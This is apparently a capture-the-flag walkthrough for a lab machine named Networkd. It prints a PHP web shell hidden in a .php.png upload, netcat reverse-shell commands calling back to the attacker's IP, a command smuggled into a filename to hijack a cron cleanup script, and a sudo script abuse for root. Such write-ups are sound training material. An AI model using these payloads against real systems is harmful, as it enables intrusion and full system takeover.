# Networkd

<img width="601" alt="Screenshot 2019-10-26 at 8 08 38 AM" src="https://user-images.githubusercontent.com/53229208/67610861-0e7b6b00-f7c8-11e9-9396-bbbde2d27c26.png">

**Summary**
1. Upload malicious file via port 80 (HTTP webserver). 
1. Trigger the uploaded malicious file and establish a reverse shell with `www-data` privilege.   
1. Privilege escalate to `guly` with the `check_attack.php` script and its cron job. 
1. Gain `root` access by exploiting the `changename.sh` script. 

## Port Scan
```
# Nmap 7.70 scan initiated Sun Oct 20 07:13:40 2019 as: nmap -sT -p- --min-rate 10000 -oA nmap-alltcp -Pn 10.10.10.146
Nmap scan report for 10.10.10.146
Host is up (0.25s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
```

## Advance on
1. Ran gobuster on the port 80 HTTP web server and discovered the following web directories and files: 
   1. /backup.tar 
   1. /index.php
   1. /lib.php
   1. /photos.php
   1. /upload.php

The `backup.tar` provides us the source files for the above items `ii` to `v`.

1. Upload a malicious image file, that is injected with PHP shell_exec code and name as `.php.png`. We can also study the `upload.php` source file to identify the controls implemented. In our case, the controls are limited file size and file extension.
   1. php shell_exec used: `<?php echo shell_exec($_GET['e'].' 2>&1'); ?>` 

   <img width="1665" alt="user" src="https://user-images.githubusercontent.com/53229208/67611430-3e2c7200-f7cc-11e9-9cb4-09cf33c07054.png">

1. From the `photos.php` page, we can identify the newly uploaded file's URL. If we study the uncovered `upload.php` source code, we understand that the uploaded file will be named after our source IP address, e.g. `10_10_15_78.php.png`.  
<img width="1369" alt="Screenshot 2019-10-26 at 8 45 09 AM" src="https://user-images.githubusercontent.com/53229208/67611558-07a32700-f7cd-11e9-85b8-67405d2316a7.png">

1. Trigger the upload PHP shell_exec, and we establish our first reverse shell.
   ```
   nc -nlvp 80 
   http://10.10.10.146/uploads/10_10_15_73.php.png?e=nc+-e+/usr/bin/bash+10.10.15.73+80
   ```

1. Identify user account `guly` and an interesting file `check_attack.php` in its home directory. The `check_attack.php` is scheduled to run every 3 minutes and execute with `guly`. It inspects the `/var/www/html/uploads/` folder and remove any unwanted files. The `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` is used to remove unwanted files, which we can also use to perform command execution by creating unwanted file with intended command as its filename. We can establish a reverse shell session with  `guly` access, by executing  `echo "" > ";nc 10.10.15.73 81 -c bash"`. 

   **[Related Reference](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)**

1. Through `guly` session, we identify an interesting script `/usr/local/sbin/changename.sh` that comes with **sudo access**. The `changename.sh` takes in user inputs, create a network script `ifcfg-guly` and triggers it. After studying the `changename.sh` script, we supplied `NAME /bin/sh` and privilege escalate with root access. 

   **[Related Reference](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)**

<img width="1680" alt="root" src="https://user-images.githubusercontent.com/53229208/67612113-67e89780-f7d2-11e9-9435-7c2d35be2606.png">













